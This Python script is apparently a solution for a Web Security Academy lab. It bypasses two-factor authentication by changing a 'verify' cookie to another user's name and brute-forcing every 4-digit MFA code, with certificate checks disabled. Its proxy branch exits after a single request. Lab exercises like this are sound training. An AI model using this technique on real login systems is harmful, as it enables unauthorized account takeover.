#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from rich.console import Console
from rich.progress import Progress
from rich import print
import sys
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Authentication Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net"
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
s = requests.Session()

def get_session(url):
    r = requests.get(url, verify=False)
    sess_line = str(r.cookies)
    spl_sess1 = sess_line.split("session=", 1)[1]
    global sess
    sess = spl_sess1.split(" ", 1)[0]
    return sess

def bypass_2fa(s, url, sess):
    login_path = '/login'
    data ={
        "username": "wiener",
        "password": "peter"
    }
    headers = {
        "Cookie": "session=" + sess + "; verify=wiener"
    }
    s.post(url + login_path, verify=False, data=data, headers=headers)
    headers1 = {
        "Cookie": "session=" + sess + "; verify=carlos"
    }
    # generate temporary 2FA code for carlos
    s.get(url + '/login2', verify=False, headers=headers1)
    console = Console()
    with Progress(transient = False) as progress:
        task = progress.add_task("[green][+] Processing...", total=9999)
        for i in range(9999):
            progress.advance(task)
            data1 = {
                "mfa-code": format(i).zfill(4)
            }
            headers2 = {
                "Cookie": "verify=carlos"
            }
            if args.proxy:
                args.proxy=str(args.proxy)
                proxies = {
                    'http': 'http://' + args.proxy,
                    'https': 'http://' + args.proxy,
                }       
                s.post(url + '/login2', data=data1, headers=headers2, verify=False, proxies=proxies)
                sys.exit(0)
            else:
                r = s.post(url + '/login2', data=data1, headers=headers1, verify=False)
                if (r.status_code == 302):
                    subprocess.call(["firefox", url])
                    sys.exit("(+) Authentication Successful!")
                else: 
                    pass

def main():
    
    print("(+) Exploiting Authentication")

    get_session(url)
    
    bypass_2fa(s, url, sess)

if __name__ == "__main__":
    main()
